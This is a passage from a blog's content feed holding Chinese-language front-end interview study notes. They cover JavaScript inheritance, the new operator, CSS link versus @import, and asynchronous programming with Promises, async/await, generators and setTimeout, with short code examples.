class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function inheritPrototype(subClass, superClass) &#123;</span><br><span class="line">  // 复制一份父类的原型</span><br><span class="line">  var p = copy(superClass.prototype);</span><br><span class="line">  // 修正构造函数</span><br><span class="line">  p.constructor = subClass;</span><br><span class="line">  // 设置子类原型</span><br><span class="line">  subClass.prototype = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">inheritPrototype(Child, Parent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：改进组合继承，利用寄生式继承的思想继承原型<br>7. new会发生什么</p><ul><li>创建空对象；<br>var obj = {};</li><li>设置新对象的constructor属性为构造函数的名称，设置新对象的proto属性指向构造函数的prototype对象；<br>obj.proto = ClassA.prototype;<br>扩展了新对象的原型链。</li><li><font color="#FF00FF">使用新对象调用函数，函数中的this被指向新实例对象：</font><br>ClassA.call(obj);　　//{}.构造函数();</li><li><font color="#FF00FF">返回this指针。当存在显示的返回时，返回return后面的内容。新建的空对象作废。</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function test() &#123;</span><br><span class="line"> this.name = &quot;test&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> test.prototype = &#123;</span><br><span class="line"> a:&#123;&#125;,</span><br><span class="line"> b:&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">var  c = new test();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件引入方式</title>
      <link href="/2022/08/03/%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F(%E7%AC%AC%E4%BA%94%E5%A4%A9)/"/>
      <url>/2022/08/03/%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F(%E7%AC%AC%E4%BA%94%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="link-和-import"><a href="#link-和-import" class="headerlink" title="link 和 @import"></a>link 和 @import</h1><p>作用：样式的导入方式</p><p><strong>link的使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;index.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>@import 的使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">@import url(index.css);</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>link 和 @import 的区别</p><ol><li>引入的内容不同<br><font color="#FF00FF">link 除了引用样式文件，还可以引用图片等资源文件，而 @import 只引用样式文件</font></li><li>加载顺序不同<br><font color="#FF8C00">link 引用 CSS 时，在页面载入时同时加载；@import 需要页面网页完全载入以后加载</font></li><li>兼容性不同<br><font color="#FF8C00">link 是 XHTML 标签，无兼容问题；@import 是在 CSS2.1 提出的，低版本的浏览器不支持</font></li><li>对 JS 的支持不同<br><font color="#FF00FF">link 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持</font><h1 id="为什么link用href获取资源-script和img用src"><a href="#为什么link用href获取资源-script和img用src" class="headerlink" title="为什么link用href获取资源 script和img用src"></a>为什么link用href获取资源 script和img用src</h1><font color="#DC143C">src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</font></li></ol><p><strong>src</strong><br>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素<br><font color="#FF8C00">当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部</font><br><strong>href</strong></p><ul><li>href是Hypertext Reference的缩写，指向网络资源所在位置，<font color="#FF8C00">建立和当前元素（锚点）或当前文档（链接）之间的链接</font></li><li>在文档中添加link标签，浏览器会识别该文档为css文件，就会<font color="#FF8C00">并行下载资源并且不会停止对当前文档的处理</font>。这也是为什么建议使用link方式来加载css，而不是使用@import方式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;common.css&quot; rel=&quot;stylesheet&quot;/&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异步相关(第三天)</title>
      <link href="/2022/08/02/%E5%BC%82%E6%AD%A5%E7%9B%B8%E5%85%B3(%E7%AC%AC%E4%B8%89%E5%A4%A9)/"/>
      <url>/2022/08/02/%E5%BC%82%E6%AD%A5%E7%9B%B8%E5%85%B3(%E7%AC%AC%E4%B8%89%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<ol><li>promise和 async await 区别</li></ol><p><strong>概念</strong><br>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，<font color="#FF8C00">Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果</font>，而这些结果一旦生成是<font color="#FF8C00">无法改变</font>的</p><p>async await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，<font color="#FF8C00">他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果</font>，它<font color="#FF00FF">返回的是一个Promise对象</font>。</p><p><strong>两者的区别</strong><br>Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个<font color="#FF8C00">回调链</font>，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以<font color="#FF8C00">提供等同于”同步效果“的等待异步返回能力的语法糖，</font>只有这一句代码执行完，才会执行下一句。<br>async await与Promise一样，是<font color="#FF00FF">非阻塞</font>的。<br>async await是基于Promise实现的，可以说是改良版的Promise，它<font color="#FF00FF">不能用于普通的回调函数</font>。</p><ol start="2"><li>defer和async区别</li></ol><p>区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer<font color="#FF8C00">会按照顺序执行</font>,而async则是在js加载好之后就会执行,并且多个async,<font color="#FF8C00">哪个加载好就执行哪个</font><br><strong>解析：</strong><br>在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后<br><strong>async：</strong> 有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行<font color="#FF00FF">并行进行（异步）。</font><font color="#FF00FF">但是多个js文件的加载顺序不会按照书写顺序进行</font><br><strong>derer：</strong> 有derer的话,加载后续文档元素的过程将和 script.js 的加载<font color="#FF00FF">并行进行（异步</font>），但是<font color="#FF00FF"> script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。</font></p><ol start="3"><li>同步和异步</li></ol><p><strong>同步</strong><br>指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。<br>也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。<br><strong>异步</strong><br><font color="#FF8C00">异步任务是指不进入主线程，而进入任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。</font><br>每一个任务有一个或多个回调函数。<font color="#FF00FF">前一个任务结束后，不是执行后一个任务,而是执行回调函数</font>，后一个任务<font color="#FF00FF">则是不等前一个任务结束就执行。</font><br>程序的执行顺序和任务的排列顺序是不一致的，异步的。<br>我们常用的setTimeout和setInterval函数，Ajax都是异步操作。</p><ol start="4"><li>实现异步的方法</li></ol><p>回调函数（Callback）、事件监听、发布订阅、Promise/A+、生成器Generators/ yield、async/await<br>JS 异步编程进化史：<font color="#FF00FF">callback -&gt; promise -&gt; generator -&gt; async + await</font><br><font color="#FF8C00">async/await 函数的实现，</font>就是将 Generator 函数和自动执行器，包装在一个函数里。<br>async/await可以说是异步终极解决方案了。</p><p>(1) async/await函数相对于Promise，优势体现在：</p><p>处理 then 的调用链，能够更清晰准确的写出代码<br>并且也能优雅地解决回调地狱问题。<br>当然async/await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，<font color="#FF00FF">如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。</font></p><p>(2) async/await函数对 Generator 函数的改进，体现在以下三点：</p><p><font color="#FF8C00">内置执行器。</font> Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。<br><font color="#FF8C00">更广的适用性</font>。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。<br><font color="#FF8C00">更好的语义。</font> async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await <font color="#FF00FF">表示紧跟在后面的表达式需要等待结果</font>。</p><p><strong>回调函数（Callback）</strong><br>回调函数是异步操作最基本的方法。以下代码就是一个回调函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ajax(url, () =&gt; &#123;</span><br><span class="line">    // 处理逻辑</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是回调函数有一个致命的弱点，就是容易写出<strong>回调地狱（Callback hell</strong>）。假设多个请求存在依赖性，你可能就会写出如下代码：</p><figure class="highlight plaintext"><figcaption><span>() </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    // 处理逻辑</span><br><span class="line">    ajax(url1, () =&gt; &#123;</span><br><span class="line">        // 处理逻辑</span><br><span class="line">        ajax(url2, () =&gt; &#123;</span><br><span class="line">            // 处理逻辑</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度耦合，使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。<font color="#FF00FF">此外它不能使用 try catch 捕获错误，不能直接 return</font>。<br><strong>事件监听</strong><br>这种方式下，<strong>异步任务的执行不取决于代码的顺序，而<font color="#FF00FF">取决于某个事件是否发生</font>。</strong><br>下面是两个函数f1和f2，编程的意图是f2必须等到f1执行完成，才能执行。首先，为f1绑定一个事件（这里采用的jQuery的写法）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1.on(&#x27;done&#x27;, f2);</span><br></pre></td></tr></table></figure><p>上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f1() &#123;</span><br><span class="line">  setTimeout(function () &#123;</span><br><span class="line">    // ...</span><br><span class="line">    f1.trigger(&#x27;done&#x27;);</span><br><span class="line">  &#125;, 1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，f1.trigger(‘done’)表示，执行完成后，立即触发done事件，从而开始执行f2。<br>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”，有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。<br><strong>发布订阅</strong><br>我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern）。</p><p>这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。<br><strong>Promise/A+</strong><br>Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等<br><font color="#FF8C00">三种状态</font><br>Pending—-Promise对象实例创建时候的初始状态<br>Fulfilled—-可以理解为成功的状态<br>Rejected—-可以理解为失败的状态</p><p><img src="http://files.shanqianche.cn/20228/1659430720168.png" alt="Promise状态"><br><font color="#FF8C00">这个承诺一旦从等待状态变成为其他状态就永远不能更改状态了</font><br>promise的链式调用</p><ul><li>每次调用返回的都是一<font color="#FF00FF">个新的Promise实例(这就是then可用链式调用的原因)</font></li><li>如果then中返回的是一个结果的话会把这个结果传递下一次then中的<font color="#FF8C00">成功</font>回调</li><li>如果then中出现异常,会走下一个then的<font color="#FF8C00">失败</font>回调</li><li>在then中<font color="#FF8C00">使用了return，那么return的值会被Promise.resolve()</font> </li><li>then中可以不传递参数，如果不传递会透到下一个then中</li><li>catch 会捕获到没有捕获的异常</li><li>也是存在一些缺点的，<font color="#FF00FF">比如无法取消 Promise，错误需要通过回调函数捕获</font>。</li></ul><p><strong>生成器Generators/ yield</strong><br>Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同，Generator 最大的特点就是<font color="#FF8C00">可以控制函数的执行</font>。</p><p>语法上，首先可以把它理解成，<font color="#DEB887">Generator 函数是一个状态机，封装了多个内部状态</font>。<br>Generator 函数除了状态机，还是一个<font color="#FF00FF">遍历器对象生成函数</font>。<br>可暂停函数, <font color="#FF00FF">yield可暂停，next方法可启动，每次返回的是yield后的表达式结果</font>。<br><font color="#FF00FF">yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function *foo(x) &#123;</span><br><span class="line">  let y = 2 * (yield (x + 1))</span><br><span class="line">  let z = yield (y / 3)</span><br><span class="line">  return (x + y + z)</span><br><span class="line">&#125;</span><br><span class="line">let it = foo(5)</span><br><span class="line">console.log(it.next())   // =&gt; &#123;value: 6, done: false&#125;</span><br><span class="line">console.log(it.next(12)) // =&gt; &#123;value: 8, done: false&#125;</span><br><span class="line">console.log(it.next(13)) // =&gt; &#123;value: 42, done: true&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能结果跟你想象不一致，接下来我们逐行代码分析：<br>首先 Generator 函数调用和普通函数不同，它会返回一个迭代器<br>当执行第一次 next 时，传参会被忽略，并且函数暂停在 yield (x + 1) 处，所以返回 5 + 1 = 6<br>当执行第二次 next 时，传入的参数12就会被当作上一个yield表达式的返回值，如果你不传参，yield 永远返回 undefined。此时 let y = 2 * 12，所以第二个 yield 等于 2 * 12 / 3 = 8<br>当执行第三次 next 时，传入的参数13就会被当作上一个yield表达式的返回值，所以 z = 13, x = 5, y = 24，相加等于 42<br><strong>async/await</strong><br>使用async/await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：</p><ul><li>async/await是基于Promise实现的，它<font color="#FF8C00">不能用于普通的回调函数</font>。</li><li>async/await与Promise一样，是非阻塞的。</li><li>async/await使得异步代码看起来像同步代码，这正是它的魔力所在。</li></ul><p><font color="#FF00FF">怎么解决callback多层嵌套</font>Promises、Async/await<br><strong>Promise.all(iterable)</strong><br>Promise.all方法接受一个数组作为参数，p1、p2、p3都是Promise实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有Iterator接口，且返回的每个成员都是Promise实例。）<br>p的状态由p1、p2、p3决定，分成两种情况。<br>(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。<br>(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const p1 = &#x27;p1-ok&#x27;;</span><br><span class="line">const p2 = Promise.resolve(&#x27;p2-ok&#x27;);</span><br><span class="line">const p3 = new Promise((resolve) =&gt; setTimeout(resolve, 3000, &#x27;p3-ok&#x27;));</span><br><span class="line">const p4 = Promise.reject(&#x27;p4-err&#x27;);</span><br><span class="line">Promise.all([p1, p2, p3])</span><br><span class="line">    .then((resolves) =&gt; &#123;</span><br><span class="line">      resolves.forEach(resolve =&gt; &#123;</span><br><span class="line">          console.log(resolve); //p1-ok   p2-ok  p3-ok</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;err&#x27;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">Promise.all([p1, p2, p3, p4])</span><br><span class="line">    .then(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;ok&#x27;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch((err) =&gt; &#123;</span><br><span class="line">       console.log(err); //p4-err</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Promise.race(iterable)</strong><br>Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的回调函数。<br>Promise.race方法的参数与Promise.all方法一样，如果不是Promise实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var p1 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 500, &quot;one&quot;);&#125;);</span><br><span class="line">var p2 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 100, &quot;two&quot;);&#125;);</span><br><span class="line">Promise.race([p1, p2])</span><br><span class="line">    .then(value =&gt; &#123;</span><br><span class="line">        console.log(value); // &quot;two&quot;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">var p3 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 100, &quot;three&quot;);&#125;);</span><br><span class="line">var p4 = new Promise((resolve, reject) =&gt; &#123;setTimeout(reject, 500, &quot;four&quot;);&#125;);</span><br><span class="line"></span><br><span class="line">Promise.race([p3, p4])</span><br><span class="line">    .then((value) =&gt; &#123;</span><br><span class="line">        console.log(value); // &quot;three&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(err =&gt; &#123;</span><br><span class="line">        // 未被调用  </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">var p5 = new Promise(resolve =&gt; &#123;setTimeout(resolve, 500, &quot;five&quot;);&#125;);</span><br><span class="line">var p6 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">          setTimeout(reject, 100, &quot;six&quot;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">Promise.race([p5, p6])</span><br><span class="line">    .then((value) =&gt; &#123;</span><br><span class="line">      // 未被调用             </span><br><span class="line">    &#125;).catch((reason) =&gt; &#123;</span><br><span class="line">        console.log(reason); // &quot;six&quot;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="10"><li>用js实现sleep，用promise</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function sleep(time) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, time))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep(3000).then(() =&gt; &#123;</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。<br>缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭。</p><ol start="11"><li>实现一个 Scheduler 类，完成对Promise的并发处理，最多同时执行2个任务 &lt;TODO 理解&gt;</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">class Scheduler &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.tasks = [], // 待运行的任务</span><br><span class="line">        this.usingTask = [] // 正在运行的任务</span><br><span class="line">    &#125;</span><br><span class="line">    // promiseCreator 是一个异步函数，return Promise</span><br><span class="line">    add(promiseCreator) &#123;</span><br><span class="line">        return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">            promiseCreator.resolve = resolve</span><br><span class="line">            if (this.usingTask.length &lt; 2) &#123;</span><br><span class="line">                this.usingRun(promiseCreator)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                this.tasks.push(promiseCreator)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usingRun(promiseCreator) &#123;</span><br><span class="line">        this.usingTask.push(promiseCreator)</span><br><span class="line">        promiseCreator().then(() =&gt; &#123;</span><br><span class="line">            promiseCreator.resolve()</span><br><span class="line">            this.usingMove(promiseCreator)</span><br><span class="line">            if (this.tasks.length &gt; 0) &#123;</span><br><span class="line">                this.usingRun(this.tasks.shift())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usingMove(promiseCreator) &#123;</span><br><span class="line">        let index = this.usingTask.findIndex(promiseCreator)</span><br><span class="line">        this.usingTask.splice(index, 1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const timeout = (time) =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line">    setTimeout(resolve, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const scheduler = new Scheduler()</span><br><span class="line"></span><br><span class="line">const addTask = (time, order) =&gt; &#123;</span><br><span class="line">    scheduler.add(() =&gt; timeout(time)).then(() =&gt; console.log(order))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addTask(400, 4) </span><br><span class="line">addTask(200, 2) </span><br><span class="line">addTask(300, 3) </span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="12"><li>循环i，setTimeout 中输出什么，如何解决（块级作用域，函数作用域）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout((i) =&gt; &#123;</span><br><span class="line">   console.log(i);</span><br><span class="line">   &#125;, 0)</span><br><span class="line">&#125;//期望：输出1到10</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>方法一</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout((i) =&gt; &#123;</span><br><span class="line">      console.log(i)</span><br><span class="line">   &#125;, 1000,i);</span><br><span class="line">&#125;</span><br><span class="line">//最精简解决方案</span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (let i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">   setTimeout(() =&gt; &#123;</span><br><span class="line">      console.log(i) </span><br><span class="line">   &#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line">//最优解决方案，利用let形成块级作用域</span><br></pre></td></tr></table></figure><ul><li>方法三</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    for (var i = 0; i&lt; 10; i++)&#123;</span><br><span class="line">      ((i)=&gt;&#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(i)</span><br><span class="line">        &#125;,1000);</span><br><span class="line">      &#125;)(i)</span><br><span class="line">    &#125;</span><br><span class="line">//IIFE(立即执行函数)，类似于let生成了块级作用域。</span><br></pre></td></tr></table></figure><ol start="13"><li>js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 